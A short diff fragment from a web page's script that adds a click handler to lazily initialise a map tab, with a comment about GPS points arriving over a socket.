+  document.querySelector('.tab-btn[data-tab="map"]').addEventListener('click', () => {
+    if (!mapInitialized) initMap();
+  });
+  // Also auto-init when GPS data arrives via a MutationObserver on the socket callback
+  // (handled by the guard in plotGpsPoint)
 });
 </script>
 </body>
